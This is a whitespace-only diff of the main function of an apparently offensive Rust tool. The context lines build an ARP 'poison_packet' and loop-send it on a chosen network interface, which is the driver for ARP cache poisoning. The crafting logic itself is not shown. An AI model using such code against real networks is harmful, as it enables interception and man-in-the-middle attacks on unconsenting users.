@@ -11,32 +11,32 @@ mod args;
 mod link;
 
 fn main() {
-	// Get the command line arguments
-	let app_args = args::get_args();
+    // Get the command line arguments
+    let app_args = args::get_args();
 
     // Closure to be used as a filter
-	let iface_match = |iface: &datalink::NetworkInterface| {
+    let iface_match = |iface: &datalink::NetworkInterface| {
         iface.name == app_args.interface
     };
     let interfaces = datalink::interfaces();
-	let iface = match interfaces.into_iter()
-						        .filter(iface_match)
+    let iface = match interfaces.into_iter()
+                                .filter(iface_match)
                                 .next() {
-		Some(i) => i,
-		None => {
-			eprintln!(
-                "Could not find interface: {}, exiting.", 
+        Some(i) => i,
+        None => {
+            eprintln!(
+                "Could not find interface: {}, exiting.",
                 app_args.interface
             );
-			exit(1);
-		},
-	};
+            exit(1);
+        },
+    };
 
-	println!(
-		"Using interface: {} ({})", 
-		iface.name, 
-		iface.mac.unwrap(),
-	);
+    println!(
+        "Using interface: {} ({})",
+        iface.name,
+        iface.mac.unwrap(),
+    );
 
     let poison_packet = link::ArpoisonReply::new(
         app_args.host,
@@ -52,8 +52,8 @@ fn main() {
         );
     }
 
-    let worker_one = thread::spawn(move || { 
-        link::send_arp_loop(&iface, &poison_packet) 
+    let worker_one = thread::spawn(move || {
+        link::send_arp_loop(&iface, &poison_packet)
     });
 
     match worker_one.join() {
